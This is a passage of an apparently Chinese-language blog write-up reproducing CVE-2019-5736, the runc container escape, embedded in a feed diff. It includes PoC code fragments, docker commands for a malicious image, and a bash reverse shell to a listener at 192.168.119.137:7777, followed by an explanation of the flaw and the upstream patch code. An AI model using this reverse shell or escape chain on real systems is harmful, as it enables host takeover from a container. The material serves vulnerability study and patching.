+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int runc_fd_read = open(&quot;/proc/self/exe&quot;, O_RDONLY);</span><br><span class="line">    if (runc_fd_read == -1 ) &#123;</span><br><span class="line">        printf(&quot;[!] can&#x27;t open /proc/self/exe\n&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;[+] Opened runC for reading as /proc/self/fd/%d\n&quot;, runc_fd_read);</span><br><span class="line">    fflush(stdout);</span><br></pre></td></tr></table></figure>
+
+<p>2.调用execve执行overwrite_runc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execve(&quot;/overwrite_runc&quot;, argv_overwrite, NULL); </span><br></pre></td></tr></table></figure>
+
+<p>3.overwrite_runc写入poc string</p>
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd RunC-CVE-2019-5736</span><br><span class="line">$ docker build -t cve-2019-5736:malicious_image_POC ./malicious_image_POC</span><br><span class="line">$ docker run --rm cve-2019-5736:malicious_image_POC</span><br></pre></td></tr></table></figure>
+
+<p>修改 new_runc , 修改接收反弹shell 的地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918319.png" alt="image-20211202101831715"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.119.137/7777 0&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918255.png" alt="image-20211202101719829"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918493.png" alt="image-20211202101522575"></p>
+<p>接收反弹shell </p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918457.png" alt="image-20211202101656476"></p>
+<p>查看ip , 确认为 宿主机 </p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290919450.png" alt="image-20211202101715579"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918264.png" alt="image-20211202101936883"></p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞总结下来就是一句话，攻击者可以重写宿主机上的runc二进制文件。</p>
+<p>先来看<code>/proc/self/exe</code>是什么？</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file /proc/self/exe</span><br><span class="line">/proc/self/exe: symbolic link to /usr/bin/file</span><br></pre></td></tr></table></figure>
+
+<p>proc&#x2F;self&#x2F;exe符号链接会指向调用者自身，同理proc&#x2F;pid&#x2F;exe会指向pid进程的调用者。但是&#x2F;proc&#x2F;pid&#x2F;exe和一般符号链接不同，其不遵循符号链接的正常语义，当进程打开&#x2F;proc&#x2F;pid&#x2F;exe时，没有正常的读取和跟踪符号链接内容的过程。相反，内核只是让用户直接访问打开的文件条目。</p>
+<p>漏洞产生的原因就是宿主机通过runc对docker容器进行操作的时候没有做好访问限制，导致runc可以通过&#x2F;proc&#x2F;self&#x2F;exe符号链接来访问到宿主机上的runc文件。攻击者可以让runc运行&#x2F;proc&#x2F;self&#x2F;exe符号链接来欺骗它自己执行自己，从而对宿主机上的runc文件进行覆盖重写。</p>
+<p>具体的利用步骤：</p>
+<ol>
+<li>容器内生成一个恶意文件，将文件的调用者改为proc&#x2F;self&#x2F;exe</li>
+<li>宿主机docker exec调用该恶意文件，会调用proc&#x2F;self&#x2F;exe，也就是runc，此时容器内便可以遍历proc进程号，获取runc的进程号</li>
+<li>得到容器进称号PID后，可以获取&#x2F;proc&#x2F;pid&#x2F;exe文件描述符fd</li>
+<li>对fd进行写操作，覆盖原有runc的文件</li>
+</ol>
+<p><strong>问题1：攻击者为什么不继续写入恶意文件从而覆盖主机上的runc二进制文件？</strong></p>
+<p>因为内核将不允许在执行runC时将其覆盖。于是可以通过获取&#x2F;proc&#x2F;PID&#x2F;exe的file handler 来获取runcinit的文件描述符。 然后再写入该文件。</p>
+<p><strong>问题2：runc创建容器时,会首先创建新进程runc-init，并且runc-init在另一个namespace里面，用来做隔离，那么为什么不覆盖runc的子进程runC init？</strong></p>
+<p>CVE-2016-9962漏洞修补程序在进入容器之前就将runC init进程设置为“不可转储”（Non-dumpable）。其漏洞原理是runC init进程拥有来自宿主机的打开文件描述符，容器中的攻击者可以利用它来遍历主机的文件系统，从而打开容器。</p>
+<h3 id="seebug"><a href="#seebug" class="headerlink" title="seebug"></a>seebug</h3><p><strong>runC利用链分析</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290919387.png" alt="image-20211208090108977"></p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>更新至 最新版本</p>
+<p>官方修复方式</p>
+<p>链接: <a href="https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d">https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290919593.png" alt="image-20211208093157249"></p>
+<p>增加了一个<code>ensure_cloned_binary</code>函数</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> ensure_cloned_binary(void)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> execfd;</span><br><span class="line">    char **argv = NULL, **envp = NULL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check that we&#x27;re not self-cloned, and if we are then bail. */</span></span><br><span class="line">    <span class="type">int</span> cloned = is_self_cloned();</span><br><span class="line">    <span class="keyword">if</span> (cloned &gt; <span class="number">0</span> || cloned == -ENOTRECOVERABLE)</span><br><span class="line">        <span class="keyword">return</span> cloned;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fetchve(&amp;argv, &amp;envp) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    execfd = clone_binary();</span><br><span class="line">    <span class="keyword">if</span> (execfd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EIO;</span><br><span class="line"></span><br><span class="line">    fexecve(execfd, argv, envp);</span><br><span class="line">    <span class="keyword">return</span> -ENOEXEC;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static <span class="type">int</span> is_self_cloned(void)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd, ret, is_cloned = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOTRECOVERABLE;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line">    ret = fcntl(fd, F_GET_SEALS);</span><br><span class="line">    is_cloned = (ret == RUNC_MEMFD_SEALS);</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line">    <span class="keyword">struct</span> stat statbuf = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ret = fstat(fd, &amp;statbuf);</span><br><span class="line">    <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>)</span><br><span class="line">        is_cloned = (statbuf.st_nlink == <span class="number">0</span>);</span><br><span class="line">#endif</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="keyword">return</span> is_cloned;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>判断<code>/proc/self/exe</code>是否被clone，如果没有的话，则执行<code>clone_binary</code>函数，返回一个新的file handler。</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">static <span class="type">int</span> clone_binary(void)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> binfd, memfd;</span><br><span class="line">    ssize_t sent = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line">    memfd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line">    memfd = open(<span class="string">&quot;/tmp&quot;</span>, O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, <span class="number">0711</span>);</span><br><span class="line">#endif</span><br><span class="line">    <span class="keyword">if</span> (memfd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOTRECOVERABLE;</span><br><span class="line"></span><br><span class="line">    binfd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY | O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (binfd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> <span class="type">error</span>;</span><br><span class="line"></span><br><span class="line">    sent = sendfile(memfd, binfd, NULL, RUNC_SENDFILE_MAX);</span><br><span class="line">    <span class="built_in">close</span>(binfd);</span><br><span class="line">    <span class="keyword">if</span> (sent &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> <span class="type">error</span>;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line">    <span class="type">int</span> err = fcntl(memfd, F_ADD_SEALS, RUNC_MEMFD_SEALS);</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> <span class="type">error</span>;</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Need to re-open &quot;memfd&quot; as read-only to avoid execve(2) giving -EXTBUSY. */</span></span><br><span class="line">    <span class="type">int</span> newfd;</span><br><span class="line">    char *fdpath = NULL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (asprintf(&amp;fdpath, <span class="string">&quot;/proc/self/fd/%d&quot;</span>, memfd) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> <span class="type">error</span>;</span><br><span class="line">    newfd = open(fdpath, O_RDONLY | O_CLOEXEC);</span><br><span class="line">    free(fdpath);</span><br><span class="line">    <span class="keyword">if</span> (newfd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> <span class="type">error</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(memfd);</span><br><span class="line">    memfd = newfd;</span><br><span class="line">#endif</span><br><span class="line">    <span class="keyword">return</span> memfd;</span><br><span class="line"></span><br><span class="line"><span class="type">error</span>:</span><br><span class="line">    <span class="built_in">close</span>(memfd);</span><br><span class="line">    <span class="keyword">return</span> -EIO;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/articles/web/258398.html">https://www.freebuf.com/articles/web/258398.html</a></p>
+<p><a href="https://thinkycx.me/2019-05-23-CVE-2019-5736-docker-escape-recurrence.html">https://thinkycx.me/2019-05-23-CVE-2019-5736-docker-escape-recurrence.html</a></p>
+<p><a href="https://saucer-man.com/information_security/547.html">https://saucer-man.com/information_security/547.html</a></p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><ul>
+<li><a href="https://github.com/q3k/cve-2019-5736-poc">https://github.com/q3k/cve-2019-5736-poc</a></li>
+<li><a href="https://github.com/twistlock/RunC-CVE-2019-5736">https://github.com/twistlock/RunC-CVE-2019-5736</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
